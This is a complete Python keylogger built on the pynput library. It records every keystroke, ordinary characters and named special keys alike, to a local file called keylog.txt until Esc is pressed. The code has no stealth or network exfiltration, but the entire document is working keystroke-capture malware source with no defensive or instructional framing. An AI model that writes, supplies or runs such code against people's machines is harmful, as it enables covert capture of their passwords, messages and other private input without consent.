from pynput import keyboard

def on_press(key):
    try:
        # Log the key pressed
        with open("keylog.txt", "a") as log_file:
            log_file.write(str(key.char))
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"[{key.name}]")

def on_release(key):
    # Stop the keylogger if 'Esc' is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger():
    # Start listening to keystrokes
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
